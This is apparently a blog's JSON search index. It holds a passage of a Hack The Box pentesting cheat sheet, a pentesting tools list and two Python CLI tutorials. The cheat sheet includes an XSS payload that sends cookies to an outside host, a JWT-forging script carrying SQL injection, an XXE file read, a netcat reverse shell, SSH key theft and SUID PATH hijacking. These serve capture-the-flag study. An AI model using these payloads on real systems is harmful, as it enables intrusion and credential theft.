&quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &amp;gt;]&amp;gt;\n&amp;lt;order&amp;gt;&amp;lt;quantity&amp;gt;2&amp;lt;/quantity&amp;gt;&amp;lt;item&amp;gt;&amp;amp;xxe;&amp;lt;/item&amp;gt;&amp;lt;address&amp;gt;Fake street 1234&amp;lt;/address&amp;gt;&amp;lt;/order&amp;gt;\n\n\nJWT Key confussion attack \n\nJWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc…\n\nThey have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.\n\nThis signing and verifing is very important because it ensures that nobody modifies the tokens.\n\nHowever, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we’re using symmetric algorithm.\n\nSee the following example:\n\nIn the received side, the token is verified using symmetric and asymmetric algorithms:\nasync decode(token) {\n    return (await jwt.verify(token, publicKey, { algorithms: [&#39;RS256&#39;, &#39;HS256&#39;] }));\n}\n\nFirst, it will try with RSA (RS) and later with Hash (HS) if the previous fails.\n\nThis way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:\n\nconst fs = require(&#39;fs&#39;);\nconst jwt = require(&#39;jsonwebtoken&#39;);\n\nconst publicKey  = fs.readFileSync(&#39;./public.key&#39;, &#39;utf8&#39;);\nconst validJwtToken  = fs.readFileSync(&#39;./jwt-token.txt&#39;, &#39;utf8&#39;);\n\ndecoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]})\ndecoded[&quot;username&quot;] = &quot;admin&#39; AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -&quot;\nre_encoded = jwt.sign(decoded, publicKey, {algorithm: &#39;HS256&#39;})\n\nconsole.log(re_encoded)\n\nHere, we are using the public key to verify the received token, as the regular way.\n\nThen, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.\n\nIn this case, we are modifying the token to retrieve something from the database using an SQL injection.\n\nCross-Site Scripting (XSS) \n\nThis is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.\n\nLet’s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.\n\nE.g.\n\n  Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):\n    fetch(&quot;https://ojm5l9c8.requestrepo.com/?&quot; + document.cookie);\n    \n  \n  Write the XSS HTML code in the input form field:\n    &amp;lt;script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&amp;gt;&amp;lt;/script&amp;gt;\n    \n  \n  In the remote url (requestrepo), you’ll see the value of the document.cookie\n\n\nThere’s a security header in modern browsers to prevent this Content Security Policy (CSP). However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.\n\nFoothold, we are in \n\nAt this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:\n\nList users and groups \n\nYou can query all the available users in the target by querying /etc/passwd.\n\nTo retrieve the details about the current shell user, you can do id command. It will list the groups that the user belong. This might be useful for privilege escalation.\n\nYou can also list the binaries the user or group has access:\n\nfind / -group bugtracker 2&amp;gt;/dev/null\n\n\nSearch for interesting keywords \n\nYou can search inside the contents of files for interesting contents (passwords):\n\nLet’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:\n\ngrep -Ril &#39;passwd*&#39; /var/www/html\n\n\n-R recursive\n-i ignore case\n-l show the file, not the match\n\nLocal port forwarding \n\nImagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.\n\nWith the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port\n\nssh -L 5432:localhost:5432 christine@funnel.htb\n\n\nLateral movement \n\nNormally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc… to switch from a low-permission user to a user with more permissions. That’s called lateral movement and it’s a step forward privilege escalation.\n\nSearch for SSH keys \n\nOnce we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the .ssh folder in the user home:\n\n/home/michael/.ssh/id_rsa\nc/users/daniel/.ssh/id_rsa\n\n\nPaste the contents of that private key into the attacker machine and run:\nchmod 4000 michael-id-rsa\nssh -i michael-id-rsa michael@target.htb\n\n\nPrivilege escalation \n\nAt this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we’re exploting.\n\nPrivilege escalation on Windows \n\nYou can use https://github.com/carlospolop/PEASS-ng.\n\nYou need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.\n\nIt might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to ConsoleHost_history.txt file.\n\nAnother interesting path to privilege escalation is to check the permissions of a file. In order to do so, run icacls command. (F) means Full access and is a promising way of privilege escalation.\n\nYou can potentially modify a script and make it open a reverse shell with netcat.\n\necho C:\\Log-Management\\nc64.exe -e cmd.exe {your_IP} {port} &amp;gt; C:\\Log-Management\\job.bat\n\n\nWhen the script is executed, you’ll get a shell in the attacker netcat\n\nPrivilege escalation on Linux \n\nFirst, check what permissions sudo permissions the user has with sudo -l.\n\nAlso, check the binaries accessible to the group of the user:\nfind / -group bugtracker 2&amp;gt;/dev/null\n\nSet owner User ID \n\nIf any, check the file flags and permissions:\n\nrobert@oopsie:/var/www/html$ ls -lisa /usr/bin/bugtracker &amp;amp;&amp;amp; file /usr/bin/bugtracker\n&amp;lt;isa /usr/bin/bugtracker &amp;amp;&amp;amp; file /usr/bin/bugtracker\n264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker\n/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped\n\n\nThe flags show s and file shows setuid. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.\n\nIn our case, the binary ‘bugtracker’ is owned by root &amp;amp; we can execute it as root since it has SUID set.\n\nIf we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using cat command:\n\nrobert@oopsie:/var/www/html$ bugtracker 12\nbugtracker 12\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: 12\n12\n---------------\n\ncat: /root/reports/12: No such file or directory\n\nLooks like it’s not using the full path of the cat tool. We can create a executable named cat and put it before in PATH and it will execute that cat (/tmp/cat) instead of the real cat:\n\necho &quot;/bin/sh&quot; &amp;gt; /tmp/cat\nrobert@oopsie:/var/www/html$ export PATH=/tmp:$PATH\nrobert@oopsie:/var/www/html$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\nrobert@oopsie:/var/www/html$ bugtracker\t\nbugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: 12\n12\n---------------\n\n# whoami\nwhoami\nroot\n\n\nand we have root access.\n\nAbuse regular application \n\nIf sudo -l shows permission for any binary, check https://gtfobins.github.io/ for a way to exploit the binary to gain root access.\n\nE.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:\n\nvi\n:set shell=/bin/sh\n:shell\n\n\nAnother case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation\n"
} ,
  
  {
    "title"    : "Pentesting tools",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, pentesting",
    "url"      : "/pentesting-tools/",
    "date"     : "December 16, 2022",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.\n\n\n\nnmap\n\nnmap is a port scanner tool. By default it scan ports from 0-1000.\n\nYou should pass the -A flag...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.\n\n\n\nnmap\n\nnmap is a port scanner tool. By default it scan ports from 0-1000.\n\nYou should pass the -A flag which enables OS detection, version detection, script scanning, and traceroute:\n\nnmap -A &amp;lt;ip&amp;gt;\n\n\nTo enable only service version detection:\nnmap -sV &amp;lt;ip&amp;gt;\n\n\n-sV flag does scanning and prints service and version on the found open port\n\nTo specify the default set of scripts for version identification use -sC\n\nnmap -sC &amp;lt;ip&amp;gt;\n\n\nTo scan all the ports, we need to specify this flags:\n\nnamp -sV -p- --min-rate 1000 &amp;lt;ip&amp;gt;\n\n\nTake into account that this operation will take a long time to complete.\n\n--min-rate speeds up the process by sending packets not slower than X messages per second.\n\nBe aware that this might trigger some suspicion on IDS, for that, check the -T0 or -T1 flag.\n\nIf nmap reports he has issues because could not determine if port open or closed. The machine might be protected by a firewall, instead of performing a TCP SYN scan, you can use a TCP FIN scan by providing the flag -sF\n\nYou can disable DNS resolution with -n\n\nYou can generate a nice report by using the -oX flag and --webxml, e.g.:\n\nnmap -p- -sC -sV -n --min-rate 1000 10.129.95.187 -oX nmap_allPorts --webxml\n\n\nYou can disable ping scan (blocked by firewalls) by disabling host discovery: -Pn.\n\ntelnet\n\nTelnet is a very old way of connecting to computer and by default listens on port 23.\n\nUsage:\n\ntelnet &amp;lt;ip&amp;gt;\n\n\nThe prompty will ask for user/password:\ntelnet &amp;lt;ip&amp;gt;\nTrying &amp;lt;ip&amp;gt;...\nConnected to &amp;lt;ip&amp;gt;.\nEscape character is &#39;^]&#39;.\n\n  █  █         ▐▌     ▄█▄ █          ▄▄▄▄\n  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀\n  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█\n\n\nMeow login: root\n\n\nftp\n\nStands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp)\n\nThe first thing to try while trying to access ftp is user anonymous whitout password.\n\nCommands:\n\n  ls: list directory contents\n  pass: set passive mode\n  get: retrieve file to computer\n\n\nExamples\n\nftp &amp;lt;ip&amp;gt;\nConnected to &amp;lt;ip&amp;gt;.\n220 (vsFTPd 3.0.3)\nName (&amp;lt;ip&amp;gt;:gal): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&amp;gt; ls\n500 Illegal PORT command.\nftp: bind: Address already in use\nftp&amp;gt; pass\nPassive mode on.\nftp&amp;gt; ls\n227 Entering Passive Mode (10,129,103,239,82,68).\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt\n226 Directory send OK.\nftp&amp;gt; get flag.txt /tmp/flag.txt\nlocal: /tmp/flag.txt remote: flag.txt\n227 Entering Passive Mode (10,129,103,239,159,232).\n150 Opening BINARY mode data connection for flag.txt (32 bytes).\n226 Transfer complete.\n32 bytes received in 0.00 secs (21.1291 kB/s)\n\n\n\n  in order to use the ls command, we need to set the Passive mode by issuing the pass command\n\n\nDownload all contents of ftp-server:\n\nwget -m ftp://username:password@ip.of.old.host\n\n\nTo see hidden files:\n\nls -la\n\n\nsmb\n\nStands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default.\n\nThe command line tool to interact with it, it’s smbclient.\n\nTo list shared directories:\n\nsmbclient -L \\\\&amp;lt;ip&amp;gt;\nEnter WORKGROUP\\gal&#39;s password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        WorkShares      Disk\nSMB1 disabled -- no workgroup available\n\n\nNote the \\\\ prefix, this comes from Windows slahes. Make sure to pass the --user flag, otherwise it will try to connect using your Linux user:\n\nsmbclient -L \\\\10.129.68.251 --user=&quot;Administrator&quot;\nPassword for [WORKGROUP\\Administrator]:\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\n\nNow, let’s connect to the shared:\n\nsmbclient \\\\\\\\&amp;lt;ip&amp;gt;\\\\WorkShares\nEnter WORKGROUP\\gal&#39;s password:\nTry &quot;help&quot; to get a list of possible commands.\nsmb: \\&amp;gt;\n\n\nThe commands to use once inside are the same as ftp\n\nYou can use -N flag to don’t use any password\n\nIf you see this error: protocol negotiation failed: NT_STATUS_NOT_SUPPORTED, you need to configure min/max protocol versions, see: https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed\n\nredis\n\nRedis is an in-memory key-value (NoSQL) database running on 6379 port by default\n\nTo connect to the database, we must use redis-cli:\n\nredis-cli -h &amp;lt;ip&amp;gt;\n\n\nOnce inside we can retrieve more information by using the info command:\n\n&amp;lt;ip&amp;gt;:6379&amp;gt; info\n# Server\nredis_version:5.0.7\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:66bd629f924ac924\nredis_mode:standalone\nos:Linux 5.4.0-77-generic x86_64\narch_bits:64\n\n\nTo enumerate the database with some entries, we can use the info keyspace command. This information is present in the info response as well.\n\nTo retrieve all the keys in a given database, we can use the keys * command once we have selected the database. To access a particular key, we use the get command:\n\nredis-cli -h &amp;lt;ip&amp;gt;\n&amp;lt;ip&amp;gt;:6379&amp;gt; select 0\nOK\n&amp;lt;ip&amp;gt;:6379&amp;gt; keys *\n1) &quot;numb&quot;\n2) &quot;temp&quot;\n3) &quot;flag&quot;\n4) &quot;stor&quot;\n&amp;lt;ip&amp;gt;:6379&amp;gt; keys flag\n1) &quot;flag&quot;\n&amp;lt;ip&amp;gt;:6379&amp;gt; get flag\n&quot;flag&quot;\n\n\nrdp\n\nStands for Remote Desktop Protocol and runs on port 3389.\n\nTo connect, you can use Windows tool or if in Linux, xfreerdp or any other alternative.\n\nIf checking a Windows machine, try first the Administrator user.\n\nMongoDB\n\nMongoDB is a document based (NoSQL) database that runs by default on port 27017.\n\nTo connect to it, we should use the mongo shell, currently mongosh.\n\nTo show all the database in the instance, use the show dbs command.\n\nTo select a database: use &amp;lt;db&amp;gt;\n\nTo show all the collections in a database use the show collections commands.\n\nTo show contents of all the documents inside a collection use the db.&amp;lt;collection&amp;gt;.find().pretty(). It will pretty print the results.\n\nExample:\n\nmongosh &amp;lt;ip&amp;gt;\nCurrent Mongosh Log ID: 63999d00a5b1f19a65a9d84b\nConnecting to:          mongodb://&amp;lt;ip&amp;gt;:27017/?directConnection=true&amp;amp;appName=mongosh+1.6.1\nUsing MongoDB:          3.6.8\nUsing Mongosh:          1.6.1\n\nFor mongosh info see: https://docs.mongodb.com/mongodb-shell/\n\ntest&amp;gt; show dbs\nadmin                  32.00 KiB\nconfig                 72.00 KiB\nlocal                  72.00 KiB\nsensitive_information  32.00 KiB\nusers                  32.00 KiB\ntest&amp;gt; show collections\n\ntest&amp;gt; use sensitive_information\nswitched to db sensitive_information\nsensitive_information&amp;gt; show collections\nflag\nsensitive_information&amp;gt; db.flag.find().pretty()\n[\n  {\n    _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;),\n    flag: &#39;flag&#39;\n  }\n]\nsensitive_information&amp;gt;\n\n\nrsync\n\nrsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873.\n\nWith rsync:// will use 873 port while the form user@host will use the SSH port\n\nTo list all the rsync shares:\n\nrsync --list-only rsync://&amp;lt;ip&amp;gt;\npublic         \tAnonymous Share\n\n\ngobuster\n\ngobuster performs dir busting on a web server. It discovers available paths using a word list.\n\nThe following examples checks all the words in /usr/share/dict/american-english-small dictionary and searches for paths with php extensions and stores the results in /tmp/found and uses 20 threads:\n\ngobuster -x php -u http://&amp;lt;ip&amp;gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20  \n\n\ngobuster can also perform sub-domain enumeration (by dns records or by virtual host) e.g:\n\ngobuster vhost --url http://thetoppers.htb -w /usr/share/workdlists/subdomains-top1million-5000.txt -t 50 --append-domain\n\n\nConsider using different wordlist for subdomains and for directories\n\nResponder\n\nthe responder tool: https://github.com/lgandx/Responder\n\nFor getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge.\n\nsudo responder -I tun0\n\n\nJohn the ripper\n\nPassword cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decente default dictionary, however, you can search for more complete dictionaries such as the rock you\n\nMake sure to install a version &amp;gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn’t crack a NTLMv2 hash.\n\nYou can also use zip2john tool to brute-force zip files with passwords.\n\nYou can find here https://github.com/openwall/john.\n\nYou can specify the format as well:\n\njohn --format=raw-md5 passwd.txt\n\n\nevil-winrm\n\nOnce you know the user/password of a Windows target, you can use evil-winrm to connect to the Powershell. Consider this tool as the PowerShell for Linux.\n\nThe usage is quite easy:\n\nevil-winrm -i 10.129.67.87 -u Administrator -p &amp;lt;password&amp;gt;\n\n\nIf you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash:\n\nMake sure the file /etc/ssl/openssl.cnf contains the following:\n\n[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n\n[default_sect]\nactivate = 1\n\n[legacy_sect]\nactivate = 1\n\n\npostgres\n\nBasic commands (outisde of SQL queries):\n\n\\l list databases\n\\c db connect to a database named db\n\\dt list tables on given database\n\nnetcat\n\nListen on 1234 port:\n\nnc -lnvp 1234\n\n\n-l : Listen mode\n\n-n: numeric-only IP addresses, no dns\n\n-v: verbose\n\n-p: port - we can add p to say that we want to listen on a specific port (here 1234)\n\nimpackets\n\nhttps://github.com/fortra/impacket\n\nImpacket is a collection of Python classes for working with network protocols\n\nI’ve used it to exploit samba and mssql.\n\nmssqlclient\nmssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.95.187\n\nSQL&amp;gt; xp_cmdshell whoami\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\narchetype\\sql_svc                                                                  \n\nNULL                                                                               \n\nSQL&amp;gt; \n\n\n\nwesg\n\nhttps://github.com/bitsadmin/wesng\n\nChecks for Windows vulnerabilities given the output of a systeminfo command.\n\nBurp suite\n\nhttps://portswigger.net/burp/communitydownload\n\nThis suite has a lot of nice features such:\n\n\n  Proxy\n  Repeater\n  Generating sitemap\n  …\n\n\nsqlmap\n\nChecks certain url for SQL injection vulnerabilities:\n\nThe easiest way is to capture traffic request to the possible vulnerable URL with burp and send it to sqlmap\n\nsqlmap -r search-request.txt\n\n\nif you submit the --os-shell flag you’ll get a shell on the target\n\nInteractive shell\n\nWhen doing reverse shells, the terminal is quite shitty and it lack basic features. In order to get a better shell, we could the following commands:\n\npython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n----\nstty raw -echo\nfg\nexport TERM=xterm\n\n\nSearchsploit\n\nOnce the enumeration succeded and you have the service and version, you can use searchsploit to search for possible sploits, see example:\n\nsegal@gal-Modern-14-C12M:~$ searchsploit vsFTPd 2.3.4\n---------------------------------------------- ---------------------------------\n Exploit Title                                |  Path\n---------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb\n---------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n\nGhidra\n\nIs a decompiler/debugger tool very useful to analyse binaries and understand the logic inside\n\nhttps://github.com/NationalSecurityAgency/ghidra\n\nRsaCtfTool\n\nIs a tool to check/attack RSA keys.\n\nI have used it to retrieve a private key from a weak RSA public key. The key pair are generated by multiplying two prime numbers, if the prime numbers are not big enough, they can be guessed and reveal the private key.\n\nTo decypher the file encrypted with the private key use openssl:\n\nopenssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv\n\n\nTo know the length of the RSA:\nopenssl rsa -in key.pub --RSAPublicKey_in -text -noout\nopenssl rsa -in key.priv -text -noout\n\n\ngdb\n\ngdb is the GNU debugger. See the following operations:\n\n\n  Set a breakpoint: b *0x08049291\n  Run the program: r\n  Run program with input: r &amp;lt; pattern.txt\n  Continue the execution after breakpoint: c\n  Show file information: info file\n  Show stack: x/60x $esp\n  Show where the address points: x/i &amp;lt;address&amp;gt;, e.g.:\n    gef➤  x/i 0x7ffff7d14a37\n 0x7ffff7d14a37 &amp;lt;__GI___libc_write+23&amp;gt;:\tcmp    rax,0xfffffffffffff000\n    \n  \n  Get variable memory address (variable named target): p &amp;amp;target\n\n\ngdb-peda\n\nPython Exploit Development Assistance for GDB\n\nhttps://github.com/longld/peda\n\n\n  Create a pattern of 200 chars: pattern_create 200 bof.txt\n  Calculate the number of characters to do buffer overflow: pattern_offset &amp;lt;EIP register&amp;gt;\n  Get assembler code for function: disas &amp;lt;function&amp;gt;. The first line shows the address you must use to jump\n\n\ngdb-gef\n\nGDB-Enhaced Features\n\nhttps://github.com/hugsy/gef\n\n\n  vmmap: show how the memory is organized, very useful to calculate memory offsets:\n\n\ngef➤  vmmap \n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time\n0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time\n0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time\n0x00555555557000 0x00555555558000 0x00000000002000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time\n0x007ffff7d90000 0x007ffff7d93000 0x00000000000000 rw- \n0x007ffff7d93000 0x007ffff7dbb000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6\n0x007ffff7dbb000 0x007ffff7f50000 0x00000000028000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6\n0x007ffff7f50000 0x007ffff7fa8000 0x000000001bd000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6\n0x007ffff7fa8000 0x007ffff7fac000 0x00000000214000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6\n0x007ffff7fac000 0x007ffff7fae000 0x00000000218000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6\n\nspooky_time memory is between address 0x00555555554000 and 0x00555555558000\nlibc memory is between address 0x007ffff7d93000 and 0x007ffff7fae000\n\n"
} ,
  
  {
    "title"    : "Python cli application",
    "category" : "",
    "tags"     : " python, cli, click",
    "url"      : "/python-cli-application/",
    "date"     : "December 13, 2022",
    "excerpt"  : "I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.\n\n\n\nSince I want to create a nice CLI tool, I search some libraries and found the click library...",
  "content"  : "I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.\n\n\n\nSince I want to create a nice CLI tool, I search some libraries and found the click library: https://pypi.org/project/click/.\n\nThis tool allows the developer to create a beatiful CLI interaction with minimal code.\n\nEach operation you can perform with the application is called Command. In thise case we want to perform two operations: hello and bye, so we’ll create two commands for that.\n\nTo define a command, we need to do two things:\n\n  Create the source and annotate it with @click.group():\n\n\n@click.group()\ndef bye_source():\n    pass\n\n\n\n  Create the command method and annotate it with the source created before\n\n\n@bye_source.command()\n@user_option_required\n@verbose_option\ndef bye(**opts):\n    user_name = opts[&quot;user&quot;]\n    say_bye(user_name)\n\n\ndef say_bye(user_name):\n    debug(f&quot;Saying bye to {user_name}&quot;)\n    info(f&quot;Bye {user_name}&quot;)\n\n\nI decide to separate the bye in two methods because this way testing the actual logic is way easier. If we have it only in the bye, we need to use the click library in testing as well.\n\nOnce we have created the commands, we must define an entrypoint which imports them and setup click library:\n\nimport click\nfrom examplecli.commands.hello import hello_source\nfrom examplecli.commands.bye import bye_source\n\nWELCOME_MESSAGE = &quot;&quot;&quot;\nWelcome to Example CLI!\n&quot;&quot;&quot;\n\ndef start():\n    cli = click.CommandCollection(\n        sources=[hello_source, bye_source], help=WELCOME_MESSAGE)\n    cli()\n\n\nif __name__ == &#39;__main__&#39;:\n    start()\n\n\nNow we can run the program directly from the console:\n\npython3 examplecli/entrypoint.py      \nUsage: entrypoint.py [OPTIONS] COMMAND [ARGS]...\n\n  Welcome to Example CLI!\n\nOptions:\n  --help  Show this message and exit.\n\nCommands:\n  bye\n  hello\n\n\nIf we want to package the application, we need to do one more thing. In the setup.py file we must specify the console entrypoiny:\n\n#!/usr/bin/env python\n\nfrom setuptools import setup, find_packages\nfrom os import environ\n\nwith open(&#39;requirements.txt&#39;) as fp:\n    install_requires = fp.read()\n\nwith open(&#39;requirements_test.txt&#39;) as fp:\n    tests_require = fp.read()\n\nsetup(name=&#39;example-cli&#39;,\n      version=environ.get(&#39;EXAMPLE_CLI_VERSION&#39;, &#39;0.0.1&#39;),\n      description=&#39;Example CLI&#39;,\n      author=&#39;Adrian Galera&#39;,\n      author_email=&#39;&#39;,\n      python_requires=&#39;&amp;gt;=3.6.*&#39;,\n      packages=find_packages(),\n      install_requires=install_requires,\n      tests_require=tests_require,\n      entry_points={\n          &#39;console_scripts&#39;: [\n              &#39;example-cli = examplecli.entrypoint:start&#39;,\n          ]\n      }\n      )\n\n\nNow we can build the app and install it using pipx:\n\nEXAMPLE_CLI_VERSION=$VERSION python3 setup.py sdist bdist_wheel\npipx install dist/example_cli-0.0.1+local*-py3-none-any.whl --force\n\n\npipx will create the binary cli tool. Now we can run it as a standalone application:\n\nexample-cli hello --user test\n2022-12-13T15:40:23.029Z | Hello test\n\n"
} ,
  
  {
    "title"    : "Python app structure",
    "category" : "",
    "tags"     : " python, architecture, cli",
    "url"      : "/python-app-structure/",
    "date"     : "December 13, 2022",
    "excerpt"  : "Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.\n\n\n\nProject structure\n\nHere you can find the project structure of a python application i...",
  "content"  : "Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.\n\n\n\nProject structure\n\nHere you can find the project structure of a python application implementing a cli tool named examplecli. You can find that app here: https://github.com/adriangalera/examplecli\n\n├── Makefile\n├── README.md\n├── examplecli\n│   ├── __init__.py\n│   ├── commands\n│   │   ├── __init__.py\n│   │   ├── bye.py\n│   │   ├── hello.py\n│   │   └── options.py\n│   ├── common\n│   │   ├── __init__.py\n│   │   └── logging.py\n│   └── entrypoint.py\n├── requirements.txt\n├── requirements_test.txt\n├── scripts\n│   ├── local-build.sh\n│   └── set-module-in-path.sh\n├── setup.py\n└── tests\n    ├── __init__.py\n    └── commands\n        ├── __init__.py\n        ├── test_bye.py\n        ├── test_hello.py\n        └── test_options.py\n\n\nLet’s list the most important stuff:\n\n\n  Makefile: contains a series of instructions on how to perform common tasks: clean, test, lint, coverage and building locally\n  examplecli: main module of the application. Contains all the application code organized as well in sub-modules.\n  README.md: Readme file that contains some documentation and help materials\n  requirements.txt: the pip libraries the app needs to be able to execute\n  requirements_test.txt: the pip libraries to run the app tests\n  scripts: useful tools for local development\n  setup.py: we’ll discuss in a following section about this file\n  tests: folder that contains the tests for the app\n\n\nVirtual environment and dependencies\n\nIn order to have a clean environment, it is very recommended to use virtual environments. This fancy feature will isolate the dependencies needed for every application.\n\nIn order to boostrap the virtual environment, you should create it (if not created) and activate it:\n\npython -m venv .venv\nsource .venv/bin/activate\n\n\nOnce the virtual environemnt is setup, you can install the dependencies in:\n\npip install -r requirements.txt\npip install -r requirements_test.txt\n\n\nThis will store the dependencies under the .venv folder\n\nPython modules\n\nYou should organise the python source code around the idea of modules. Modules are basically a folder with an empty file named __init__.py and the source code.\n\nit is very important to add the .py extension, otherwise it’s not recognized as a module\n\nDifferent parts of the application can import the modules, e.g.:\n\nimport click\n\nfrom examplecli.common.logging import debug, info\nfrom examplecli.commands.options import verbose_option, user_option_required\n\n\n@click.group()\ndef hello_source():\n    pass\n\n\n@hello_source.command()\n@verbose_option\n@user_option_required\ndef hello(**opts):\n    user_name = opts[&quot;user&quot;]\n    say_hello(user_name)\n\n\ndef say_hello(user_name):\n    debug(f&quot;Saying hello to {user_name}&quot;)\n    info(f&quot;Hello {user_name}&quot;)\n\nThis file is importing the methods debug and info from logging file in module examplecli.common\n\nsetup.py\n\nThis file is only needed if we want to package the application. Without it, we are still able to run the application by calling the entrypoint:\n\npython3 examplecli/entrypoint.py      \nUsage: entrypoint.py [OPTIONS] COMMAND [ARGS]...\n\n  Welcome to Example CLI!\n\nOptions:\n  --help  Show this message and exit.\n\nCommands:\n  bye\n  hello\n\n\nHowever, for this application, we want to package it into a wheel file and install it with pipx. In order to do that, we need the setup.py file. Let’s see what’s inside of this file:\n\n#!/usr/bin/env python\n\nfrom setuptools import setup, find_packages\nfrom os import environ\n\n# reads the requirements and stores them into a variable\nwith open(&#39;requirements.txt&#39;) as fp:\n    install_requires = fp.read()\n\n# reads the test requirements and stores them into a variable\nwith open(&#39;requirements_test.txt&#39;) as fp:\n    tests_require = fp.read()\n\nsetup(name=&#39;example-cli&#39;, # name of the package\n      version=environ.get(&#39;EXAMPLE_CLI_VERSION&#39;, &#39;0.0.1&#39;), # reads the variable from a environment variable\n      description=&#39;Example CLI&#39;, # provides a description of the package\n      